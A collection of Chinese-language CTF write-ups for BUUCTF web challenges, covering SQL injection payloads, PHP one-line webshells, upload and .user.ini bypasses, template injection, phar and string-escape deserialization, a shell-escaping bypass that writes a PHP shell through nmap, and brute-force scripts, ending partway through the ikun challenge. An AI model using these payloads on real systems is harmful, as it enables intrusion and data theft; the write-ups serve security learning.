# MISC
## N种方法解决
下载文件，使用strings命令查看，发现是base64，解码后发现是一张二维码，扫码得到flag

----
## 

# Web
## [HCTF 2018]WarmUp  
应该算是我CTF生涯中第一道正式的web题了吧，不得不说首先打开这个网页看见一个滑稽我内心是崩溃的==  
既然啥都没有，那当然是要Ctrl+U看看源代码。  
<img src='1-1.png' width=50%>  
访问source.php  
<img src='1-2.png' width=50%>  
以我羸弱的php知识外加Google发现这里有一个Checkfile，如果发现文件路径($page)在白名单中(包含编码后的)，则直接返回true。  
接着访问hint.php  
<img src='1-3.png' width=50%>  
好像现在没什么卵用
回到刚刚的source.php，我们可以这样绕过：  
<img src='1-4.png' width=50%>  
得到flag

----

## [强网杯 2019]随便注  
这个注入太难顶了，以前做的那些都不叫啥玩意儿。fuzz下发现跳了个语句  
`return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`
去重修了以下sql发现还有很多语句没有过滤，先来试个`1';show tables#`，可以发现有两个表1919810931114514和words  
```
array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}
```  
然后我们查看1919810931114514的内容：
```1';show columns from `1919810931114514`#```
如下
```
array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```  
查看words的内容：
```1';show columns from `words`#```
如下
```
array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(10)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(11) "varchar(20)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```  
好吧现在我又看不懂了qaq。不过既然flag在前面那个表，而且把select过滤了，我是真的不知道该怎么操作了。遂看wp，发现有个`prepare`预编译指令。先把```select * from `1919810931114514`;```char化，然后使用`set`指令将char化后的语句弄到一个变量里面，然后是用`prepare`把变量预编译，然后执行。当然也可以使用mysql的handler，```inject=';handler+`1919810931114514`+open;handler`1919810931114514`read+first%23```也是可以得到flag的。  
payload如下：
```
-1';set @a = CONCAT('se','lect * from `1919810931114514`;');prepare b from @a;EXECUTE b;#
```
获得flag

----
## [HGAME 2020]Cosmos的博客
看见提示说用了git，考虑githack，发现没有什么卵用，冥思苦想后访问`.git/config`，发现GitHub地址，访问后在历史记录中找到flag。

----
## [护网杯 2018]easy_tornado  
一开始就看到三个提示  
```
/flag.txt
/welcome.txt
/hints.txt
```
查看发现内容如下
```
node3.buuoj.cn/file?filename=/flag.txt&filehash=876c24991edc20a61fc400d87f906e58
/flag.txt
flag in /fllllllllllllag

node3.buuoj.cn/file?filename=/welcome.txt&filehash=90dd1edab19fecf7c8b769af3da6ef18
/welcome.txt
render

node3.buuoj.cn/file?filename=/hints.txt&filehash=54f48cbcbf5ea9c0b49720e19d601406
/hints.txt
md5(cookie_secret+md5(filename))
```
看见有render，修改filehash出现错误，链接为
```
node3.buuoj.cn/error?msg=Error
```
msg可控，猜测有模板注入，查资料后发现`handler.settings`储存有`cookie_secret`，于是尝试
```
node3.buuoj.cn/error?msg={{handler.settings}}
```
弹出设置
```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'f285519a-1ab3-4870-9180-1a0c5be8eda7'}
```
于是直接构造获得字符串md5加密flag

----
## [SUCTF 2019]EasySQL
看起来又是一个注入，随便输入了几个数字，发现0是没有回显的（好像没有什么卵用）。`1;show tables;`试试，发现有显示表名：
```
Array
(
    [0] => 1
)
Array
(
    [0] => Flag
)
```
然后尝试```1;show columns from `Flag` ```，好吧我知道出题人没这么sb。再来看看数据库`1;show databases;`，发现有点东西：
```
Array
(
    [0] => 1
)
Array
(
    [0] => ctf
)
Array
(
    [0] => ctftraining
)
Array
(
    [0] => information_schema
)
Array
(
    [0] => mysql
)
Array
(
    [0] => p
}
```
似乎也没啥卵用。fuzz了一下，显然是堆叠注入，但发现一大堆的关键字都被过滤了。查看了wp源码里面看到查询语句是`select $post['query']||flag from Flag`，可以发现这个||是逻辑运算符或，答案只能是0/1，所以要查询的话，就需要把||的作用去掉，按wp上的做法，用的是
```
1;set sql_mode=PIPES_AS_CONCAT;select 1
```
可以发现语句就变成了
```
select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag
```
`set sql_mode=PIPES_AS_CONCAT;`的意思就是把||视为字符串拼接，然后getflag。  
不过在翻看dalao博客的时候发现了这个东西`select *,1||flag from Flag`，好吧我确实是没有想到还有这种操作的。

----
## [HCTF 2018]admin
好吧，第一次看见这么现代化的题目，着实搞得我比较懵，首先尝试登录admin，无法确定admin是否存在，于是打开注册页面，注册admin，发现有admin账户，然后，然后就不知道怎么搞了qaq。当个正常用户试试注册，然后当然是成功注册，就没有然后了，放弃这题。
>更新，后来看见buu里面就这个题在前面空着感觉很不爽，于是又来做一做。  
打开index页面html有注释：
```
<!-- you are not admin -->
```
好吧我知道不是admin qaq。在change页面发现了这个：
```
<!-- https://github.com/woadsl1234/hctf_flask/ -->
```
终于有点思绪了啊啊啊啊。clone下来，出题人竟然也是用的vscode。

----
## [强网杯 2019]高明的黑客
一打开发现了一大堆奇怪的源码，然后发现了有一大堆的system，不过执行条件看得我很懵好吗
```
if('V8dfwnVA5' == 'n3Ofh5nSW')
system($_POST['V8dfwnVA5'] ?? ' ');
```
这样的东西是什么鬼啊，这个还怎么tmd执行。猜测总有可以用的一个webshell，于是，开始暴力。遍历每一个文件的每一个传参位置，总会有正确的一个。用python写个脚本，让它自动跑一跑。（加上了进度条，不然看着总以为没动静）
```
import os
import requests
import re
import progressbar

FilePath = './src/'
files = os.listdir(FilePath)
url = 'http://8e790631-8693-48d7-a070-a30a598d21ca.node3.buuoj.cn/'
p = progressbar.ProgressBar(len(files))
cnt = 0

def get_params(name):
    ans = []
    name = FilePath + name
    phpfile = open(name, 'r')
    get = re.compile(r"GET\['(.+?)'\]")
    post = re.compile(r"POST\['(.+?)'\]")
    getnum = re.findall(get, phpfile.read())
    postnum = re.findall(post, phpfile.read())
    ans.append(getnum)
    ans.append(postnum)
    return ans

def send(params, filename):

    ans1 = ''
    ans2 = ''

    for param_get in params[0]:
        get = requests.get(url + filename + '?' + param_get + '=cat /flag')
        ans1 = re.findall(r'flag*', get.text)
        if ans1 != []:
            return param_get

    for param_post in params[1]:
        post = requests.post(url + filename, data={param_post: 'cat /flag'})
        ans2 = re.findall(r'flag*', post.text)
        if ans2 != []:
            return param_post
    
    return False

if __name__ == '__main__':
    for i in files:
        try:
            params = get_params(i)
            ans = send(params, i)
            if ans != False:
                print('php file is:' + i + ' and the param is:' + ans)
                exit()
            cnt += 1
            p.update(cnt)
        except:
            pass
```
成功getflag

----
## [RoarCTF 2019]Easy Calc
一打开发现是一个计算器，查看源码后发现有一个`calc.php`，并且传入了一个参数`num`来实现计算功能。代码如下：
```
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```
明确的是要绕过检测，那我们使用
```
calc.php? num=var_dump(scandir(chr(47)))
```
加一个空格，可以使get得到为有空格的变量，而解析的时候变成没有空格的变量。过滤了目录符号，我们使用chr(47)来绕过。可以发现目录结构如下：
```
array(24) { 
    [0]=> string(1) "." 
    [1]=> string(2) ".." 
    [2]=> string(10) ".dockerenv" 
    [3]=> string(3) "bin" 
    [4]=> string(4) "boot" 
    [5]=> string(3) "dev" 
    [6]=> string(3) "etc" 
    [7]=> string(5) "f1agg" 
    [8]=> string(4) "home" 
    [9]=> string(3) "lib" 
    [10]=> string(5) "lib64" 
    [11]=> string(5) "media" 
    [12]=> string(3) "mnt" 
    [13]=> string(3) "opt" 
    [14]=> string(4) "proc" 
    [15]=> string(4) "root" 
    [16]=> string(3) "run" 
    [17]=> string(4) "sbin" 
    [18]=> string(3) "srv" 
    [19]=> string(8) "start.sh" 
    [20]=> string(3) "sys" 
    [21]=> string(3) "tmp" 
    [22]=> string(3) "usr" 
    [23]=> string(3) "var" 
}
```
发现有一个`f1agg`，于是查看：
```
/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

----
## [SUCTF 2019]CheckIn
看题目像是一道签到题==。打开发现是一个文件上传的页面。尝试上传一个php文件，显而易见的是会显示非法的。  
于是我们准备一个一句话木马，修改文件后缀后传入，文件名为`test.ppp`
```
<?php eval(@$_GET['a']); ?>
```
好吧这个签到题并没有我想的这么简单，提示了
```
<? in contents!
```
看起来是对文件内容进行了过滤。所以我们随便整点东西进去，发现有提示：
```
exif_imagetype:not image!
```
好吧，看起来要加一个图像文件头。`BM`是bmp文件头，加上过后发现上传成功：
```
Your dir uploads/2c67ca1eaeadbdc1868d67003072b481
Your files :
array(4) { 
    [0]=> string(1) "."
    [1]=> string(2) ".."
    [2]=> string(9) "index.php"
    [3]=> string(8) "test.ppp" 
}
```
看起来我们可以准备一个长得像这样的图片马：
```
BM
<script language="php">eval($_GET['a']);</script>
```
由于要使图片马运行，则需要将文件解析为php代码，于是经过查找资料，发现修改`.htaccess`和`.user.ini`可以实现这一点，而经过测试发现这是个nginx，`.htaccess`是apache专用，于是就修改后者。
```
BM
auto_prepend_file=a.jpg
```
这样就可以实现运行每个php文件后都会自动解析a.jpg作为php代码。
然后`var_dump(scandir('/'))`发现存在`/flag`，查看内容，`var_dump(file_get_content('/flag'))`得到flag

----
## [CISCN2019 华北赛区 Day2 Web1]Hack World
看起来是个布尔盲注，进行测试，发现查询成功是true，错误是false，fuzz后发现大部分的语句都没有被过滤，并且空格可用(或者)绕过。  
使用`id=1=1`和`id=1=0`输出不一致进行注入。  
编写脚本：
```
import requests
import string

url = 'http://3a5eb2a7-2181-43b5-8d42-bf30a66184b4.node3.buuoj.cn'
flag = ''

if __name__ == "__main__":
    printablelist = string.printable
    for i in range(1, 50):
        for j in printablelist:
            res = requests.post(url, data={'id': '1=if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)' % (i, ord(j))})
            if 'Hello' in res.text:
                flag += j
                print(flag)
                break
```
得到flag

----
## [De1CTF 2019]SSRF Me
打开看到的是一大堆乱码，看得我一脸懵逼。查看源码后发现这是用flask写的，里面有几个路由
- `/geneSign`可由post和get接受param的文件路径并和scan与secret_key生成一个md5作为签名
- `/De1ta`由cookie接受action和sign，另由post或get接受param，显示action的操作结果
- `/`直接打开就是显示源代码
  
要注意一下的就是里面生成签名只能由`/geneSign`路由生成，但是很显然的发现我们需要生成一个有效的action为read的签名才能对scan得到的文件进行读取得到flag。  
查找资料后发现这是一个典型的哈希长度拓展攻击伪造签名。  
大概意思就是当知道`hash(secret + message)`的值及`secret`长度的情况下，可以推算出`hash(secret + message + padding + m)`。在这里`m`是任意数据，`padding`是`secret`后的填充字节，`message`是之前的已知数据。  
对于本题，我们可以发现，计算签名的方法是`md5(secert_key + param + action)`，我们可以控制的有两个量，`param`和`action`，联系哈希长度攻击的特点，攻击点显然就在最后面的`action`。  
- 已知量：`/geneSign`获得的签名`md5(secert_key + 'flag.txt' + 'scan')`  
- 伪造量：`md5(secert_key + 'flag.txt' + 'scanread')`
  
于是步骤就显而易见了。  
```
hashpumpy.hashpump('ad25170d3a7ea6b2c1d5e5b3c3afd8ca','flag.txtscan','read',16)
#hashpump中，第一个参数是已知的md5，第二个参数是原message，第三个是攻击数据，最后一个是key长度
```
得到flag

----
## [网鼎杯 2018]Fakebook
打开看起来像是一个留言板，随便注册一个账号，发现blog那里只能填链接，于是就填了个baidu.com，之后登录发现，网页里面有一个iframe，但是没有内容qaq。测试了一下admin，竟然注册成功了wdnmd。  
用burpsuite扫了一下，发现有`robots.txt`且存在注入。  
查看robots.txt
```
User-agent: *
Disallow: /user.php.bak
```
发现有源码泄露
```
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}
```
并且`view.php`页面存在注入。尝试注入时，`union select`会显示hack，于是使用注释符号绕过`union/**/select`。使用`order by`测试出查询有4个字段。注入：
```
-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
```
获得表`users`
```
-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
```
获得列`no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS`
```
-1 union/**/select 1,data,3,4 from users where name='123'
```
发现序列化数据`O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:9:"baidu.com";} `。  
使用注入访问`file:///var/www/html/flag.php`
```
-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:7:"abelche";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```
得到flag

----
## [极客大挑战 2019]Havefun
f12查看源码即可解题

----
## [极客大挑战 2019]EasySQL
常识题  
```
username=admin
password=1 or 1=1#
```

----
## [RoarCTF 2019]Easy Java
进去是一个登陆页面，先尝试注入，尼玛完全没反应。查看源码后发现有一个`Download?filename=help.docx`，访问没有反应，尝试改为post，得到文件内容，恢复为docx：
```
Are you sure the flag is here? ? ?
```
看起来没啥卵用。查过资料后发现，java里面有一个WEB-INF文件夹，专门放不可直接访问的网页。
```
WEB-INF主要包含一下文件或目录:
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties：数据库配置文件
漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码
```
那我们就先看看这个`/WEB-INF/web.xml`，发现`FlagController`，查看文件`/WEB-INF/classes/FlagController.class`  
得到flag

----
## [极客大挑战 2019]Secret File
burpsuite抓包发现有`secr3t.php`，访问后发现是一个文件查看。使用
```
php://filter/read=convert.base64-encode/resource=flag.php
```
php伪协议绕过，发现flag

----
## [0CTF 2016]piapiapia
打开是一个登陆页面，用御剑扫，发现有`register.php`，`config.php`，用dirscan扫，发现了源码备份文件`www.zip`：
```
static
upload
class.php       #类
config.php      #连接mysql服务器配置
index.php       #登录页面
profile.php     #反序列化加载用户数据
register.php    #注册页面
update.php      #新增用户数据，序列化写入数据库
```
`class.php`中写了一个`user`类继承自`mysql`类，将`config.php`包含，`config.php`里面有连接`mysql`的相关信息，可以发现有个`flag`变量。  
传文件的时候成功传了一个马上去，但是并没有找到解析为php的方法。本题用了序列化，猜测是利用反序列化字符串逃逸读取config中的内容。
```
$profile['phone'] = 12345678901;
$profile['email'] = 'v@v.v';
$profile['nickname'] = 'vc';
$profile['photo'] = 'upload/' . md5($file['test.php']);
serialize($profile);
```
序列化后是
```
a:4:{s:5:"phone";i:12345678901;s:5:"email";s:5:"v@v.v";s:8:"nickname";s:2:"vc";s:5:"photo";s:39:"upload/93bc3c03503d8768cf7cc1e39ce16fcb";}
```
序列化以后，`filter`方法会将`where`替换为`hacker`，刚好多了一个长度。并且`phone`和`email`都是限制死了，只有`nickname`有点操作空间，大概思路就是构造一个带有`where`并且`photo`为`config.php`的字符串提交上去，程序将替换多出来的字符顶替提交上去的`photo`字段。  
这时发现`nickname`有长度限制，我们需要使用数组来绕过`strlen`。  
我们所需要添加的序列化字符串为
```
";}s:5:"photo";s:10:"config.php";}
```
要添加34个字符才能把这一串挤出去，于是就要添加34个where在前面
```
wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```
得到flag

----
## [极客大挑战 2019]PHP
打开是一个页面：
```
因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 
```
盲猜是源码泄露，`www.zip`，竟然一下就猜到了，文件如下：
```
class.php
flag.php
index.js
index.php
style.css
```
`index.php`这里也是用到了反序列化。这里的反序列化是直接运行，没有进行任何的判断。于是我们使用反序列化来修改，要注意一下的就是类中的权限问题，对于Public当然名字就没改变，对于Private，格式应该是`%00类名%00属性名`，Protect是`%00*%00属性名`。于是构造payload如下：
```
O:4:"Name":10:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```
得到flag

----
## [极客大挑战 2019]Knife
打开是一个页面
```
我家菜刀丢了，你能帮我找一下么
eval($_POST["Syc"]);
```
显然是一个一句话。用burp直接提交，没反应，尝试菜刀，可以过，对比header后发现需要加上`Content-Type: application/x-www-form-urlencoded`  
得到flag

----
## [SUCTF 2019]Pythonginx
打开就能看见源码。看起来是一个绕过：
```
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```
使用了三种方法过滤，找到了一个[资料](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)。
抄到一个脚本：
```
from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni=chr(x)
        url="http://suctf.c{}".format(uni)
        try:
            if getUrl(url):
                print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
        except:
            pass


def getUrl(url):
    url = url
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return False
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False

if __name__=="__main__":
    get_unicode()
```
我们使用`str: Ｃ unicode: \uff23`字符来绕过来查看`/usr/local/nginx/conf/nginx.conf`
```
file://suctf.cＣ/../../../../../usr/local/nginx/conf/nginx.conf
```
然后发现有个
```
file://suctf.cＣ/../../../../../usr/fffffflag
```
得到flag

----
## [CISCN2019 华北赛区 Day1 Web1]Dropbox
打开也是登录页，注入测试后没有反应，于是`dirsearch`扫后台，发现有
```
[09:27:03] 302 -    0B  - /php  ->  login.php
[09:27:03] 400 -  154B  - /%2e%2e/google.com
[09:28:46] 302 -    0B  - /adminphp  ->  login.php                               
[09:32:02] 302 -    0B  - /delete.php  ->  login.php                                                              
[09:33:25] 302 -    0B  - /index.php  ->  login.php                                                            
[09:34:08] 200 -    1KB - /login.php                                                                    
[09:34:43] 302 -    0B  - /myadminphp  ->  login.php            
[09:36:02] 200 -    1KB - /register.php                                                        
[09:36:51] 301 -  185B  - /static  ->  http://8855b362-a6d4-4711-b2c2-ce02a6d410d1.node3.buuoj.cn/static/         
[09:37:35] 302 -    0B  - /upload.php  ->  login.php                                   
[09:37:38] 301 -  185B  - /uploads  ->  http://8855b362-a6d4-4711-b2c2-ce02a6d410d1.node3.buuoj.cn/uploads/
[09:37:38] 403 -  571B  - /uploads/
```
另外还有`download.php`。可以猜测上传文件内容是放在uploads里面。测试上传php文件，失败。更改为gif后缀并加上`GIF89a`文件头上传成功。在burp中修改下载文件为`../../index.php`，把源码统统下载下来：
```
class.php       #三个类
delete.php      #删除文件
download.php    #下载文件
index.php       #
register.php    #
upload.php      #
```
尝试下载系统文件，成功，但是发现download里面专门ban掉了`flag` qaq。  
不过发现类中有魔术方法，`User`类：
```
__construct()
__destruct()
```
只对数据库进行了打开和关闭的操作，无法利用。`FileList`类：
```
__construct()   #创建新对象时运行
__call()        #对象调用的方法不存在时运行
__destruct()    #销毁对象时运行
```
有可控的操作文件的变量，可加以利用。  
payload：
```
<?php
class User {
    public $db;
}
class File {
    public $filename;
}
class FileList {
    private $files;
    public function __construct() {
        $file = new File();
        $file->filename = "/flag.txt";
        $this->files = array($file);
    }
}

$a = new User();
$a->db = new FileList();

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("exp.txt", "test");
$phar->stopBuffering();
?>
```
要注意的是上传的时候要将phar文件后缀更改为gif，而更改后缀的文件依旧可以被各种函数识别为phar文件，也就是说，是否为phar文件，只取决于文件内容，并且与文件内容的开头也没有关系，下面这样也可以正常运行。
```
文件名：phar.gif
GIF89a<?php xxxxxxx ?>
```
在del的时候在burp里面把filename改为phar://phar.gif即可  
大概思路如下  
1. 利用delete.php中调用的`$file->open()`中含有的`file_exists`触发phar反序列化解析。
2. 使用`User`类的`db`中调用了一次的`close`，将`db`设为`Filelist`类的对象，调用`Filelist`中不存在的`close`方法。
3. `close`方法不存在于`Filelist`，就会自动运行`__call()`方法。
4. `__call`方法的代码就会调用`Filelist`中新建的`File`类`file`对象中，不存在于`Filelist`类中的`close`方法，即调用`File`中的`close`方法。
5. `close`方法中会使用`file_get_contens()`函数，这个函数的返回值会储存在`Filelist`中的`result`里面。
6. `result`又会被`__destruct()`方法显示，得到flag

----
## [极客大挑战 2019]LoveSQL
一看就是个注入，然后使用
```
username = admin
password = 1'or 1=1
```
登陆成功，发现密码是一个字符串，我竟然以为这就是flag，于是提交，现实显然没有这么简单。  
于是测试
```
check.php?username=admin&password=1'or 1=1 order by 4%23
```
可以发现只有三个参数，这里要注意一下`%23`和`#`，后者会报错qaq。
然后联合注入：
```
#测试参数显示
check.php?username=admin&password=1'or 1=1 union select 1,2,3 order by 3 ASC%23

#获取表名
check.php?username=admin&password=1'or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() order by 2 ASC%23
'geekuser,l0ve1ysq1'

#获取列名
check.php?username=admin&password=1'or 1=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='geekuser' order by 2 ASC%23
'id,username,password'

#查看username
check.php?username=admin&password=1'or 1=1 union select 1,2,group_concat(username) from 'l0ve1ysq1' order by 2 ASC%23
'cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,leixiao,flag'

#读取flag
check.php?username=admin&password=1'or 1=1 union select 1,2,group_concat(password) from l0ve1ysq1 where username='flag' order by 2 ASC%23
'flag{be6b367b-2444-42e2-a40b-0d5e3cf59cd4}'
```
得到flag

----
## [BUUCTF 2018]Online Tool
打开显示源码：
```
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```
主要的问题出在这两行上面：
```
$host = escapeshellarg($host);
$host = escapeshellcmd($host);
```
`escapeshellarg`函数是将已有的字符串加上单引号，并且将字符串中原有的单引号转义。`escapeshellcmd`函数是对特殊字符进行转义，并对不配对的单引号进行转义。  
所以我们可以直接给命令加上单引号包裹然后传给host。假设要加入的命令为`xxx`，步骤如下：  
1. `escapeshellarg`处理为```'xxx'```
2. 然后为转义的单引号两边的字符串都加上单引号包裹（空的也要加哦）```''\''xxx'\'''```
3. `escapeshellcmd`处理为```''\\''xxx'\\'''```

所以最后执行的命令就是`\\xxx\`，在命令开头的地方加上看空格就可以忽略前面的反斜杠。还要利用的一个东西就是nmap的`-oG`参数，可以写入文件。  
payload：
```
host=' <?php echo `cat /flag`; ?> -oG test.php '
```
查看沙盒test.php，得到flag

----
## [ZJCTF 2019]NiZhuanSiWei
打开是源码：
```
<?php
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit();
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```
可以看见首先要绕过第一个`if`，我们使用`data`协议绕过：
```
text=data:text/plain,welcome to the zjctf
```
然后是第二个绕过，可以发现过滤了flag，尝试访问flag.php发现有这个文件，因此断定flag就在这里，并且看见后面有一个反序列化。
file这里有一个文件包含，使用php伪协议读取php源码。
```
file=php://filter/read=convert.base64-encode/resource=useless.php
```
usless.php源码：
```
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```
显然可以看出这是为后面的反序列化准备的，我们使用序列化对其进行利用。
```
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```
将file修改为useless.php。  
得到flag

----
## [极客大挑战 2019]Http
打开是一个介绍页面，html代码中也没有什么可疑的地方，然后burp扫描，发现了一个Secret.php，打开是一行文字：
```
It doesn't come from 'https://www.Sycsecret.com'
```
好吧这个太明显了，修改header中的Refer为`https://www.Sycsecret.com`即可。  
结果又跳出来一个：
```
Please use "Syclover" browser
```
好吧，修改UA为`Syclover`，但是竟然又跳出来一个
```
No!!! you can only read this locally!!!
```
好吧，修改XFF为`127.0.0.1`。  
得到flag

----
## [CISCN2019 华北赛区 Day1 Web2]ikun
打开是一个购买页面，登录admin，失败，注册用户，所有信息均填a，注册成功。发现注释中有：
```
<!--这题脑洞确实有点大,所以我们留了些hint,请注意!-->
<!--ikun人肉并祭天了潜伏已久黑粉程序员,永远不要惹我们家kunkun!-->
<!--但是这个黑粉头子好像留了很多漏洞,有没有好心人帮我们家kunkun找出漏洞?!-->
```
并且在每一个商品页面都有以下类似标签：
```
<input type="hidden" name="_xsrf" value="2|75356c41|e65c4d433e12b5e371293c8cdd3dd10b|1581594433"/>
```
题目是说要购买的lv6，找了好几页并没有找到lv6，不过访问了以下lv6对应的链接发现是有这个东西的，于是我们想到要写个脚本帮我们找，使用二分法找到最后一页：
```
import requests
import re

url = 'http://b8e0235a-f240-455d-a375-9f4fb9b27e4c.node3.buuoj.cn/shop?page='

for i in range(0, 500):
    url_t = url + str(i)
    res = requests.get(url_t)
    print(i)
    if '/static/img/lv/lv6.png' in res.text:
        print("ans:%d" % i)
        break
```
找到lv6是在180页，传说中的lv6果然贵得一p，不过发现有个折扣券，并且cookie里面有很多东西，于是猜测是更改cookie修改价格或者折扣来完成购买操作的
```
Cookie:
_xsrf=2|227cff14|b115de16695b26b62660afd98a74425e|1581594433;
commodity_id="2|1:0|10:1581601241|12:commodity_id|8:MTYyNA==|98a33c4c4b021b2fabeb8faee18351779c8e489e11bf7a944f88bb6a364a6219";
JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEifQ.B-OZYHuG5HRg_eOm_FujDz6VVR6xpA1ENW4jZ5D4qxo

param:
_xsrf=2|60ba95ac|f3d3b4ae2b9d4c0e64a6c561c8b228e6|1581594433
&
id=1624
```
可以猜测`1581594433`是用户ID，点击结算，抓包：
```
Cookie:
_xsrf=2|227cff14|b115de16695b26b62660afd98a74425e|1581594433;
commodity_id="2|1:0|10:1581602242|12:commodity_id|8:MTYyNA==|f83ff9b924eaaac1ea2a0dc46b43962dbd36ae8ed96605c96fb44ca83df37378";
JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEifQ.B-OZYHuG5HRg_eOm_FujDz6VVR6xpA1ENW4jZ5D4qxo

param:
_xsrf=2|0eaae91b|9dc3c819458d30b90ab6b9d6a6a25451|1581594433&id=1624&price=1145141919.0&discount=0.8
```
尝试修改折扣为0.000000001，触发重定向，发现有个jwt，[查资料](https://jwt.io/)后发现是一种认证，还有一个key用于加密。重定向到`/b1g_m4mber`：
```
该页面，只允许admin访问
```
